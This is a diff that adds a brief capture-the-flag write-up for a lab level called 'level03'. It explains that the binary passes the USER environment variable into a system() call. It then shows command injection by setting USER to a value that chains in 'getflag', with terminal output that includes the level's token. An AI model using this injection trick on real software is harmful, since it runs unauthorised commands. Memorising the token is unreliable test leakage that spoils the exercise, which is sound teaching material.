@@ -1,0 +1,38 @@
+# if we look at level03.s
+```
+...
+.LC0:
+	.string	"USER"
+.LC1:
+	.string	"/bin/echo %s is cool"
+...
+```
+# .LC0 get the USER var from ENV
+# .LC1 Should be the final string to be exec by system()
+# .LC2 the call to system with final string
+
+# so
+# system("/bin/echo %s is cool") => system("/bin/echo [USER INPUT] is cool")
+
+# we just need to change the USER var form ENV by what we want like
+```
+USER='toto && getflag && echo'
+```
+
+# the final system sould look like
+```
+system("/bin/echo toto && getflag && echo is cool")
+```
+
+# you just need to launch the program
+./level03
+
+# result
+```
+level03@BornToSec:~$ USER='toto && getflag && echo '
+level03@BornToSec:~$ ./level03
+toto
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+is cool
+calling system("/bin/echo toto && getflag && echo  is cool")\nlevel03@BornToSec:~$
+```
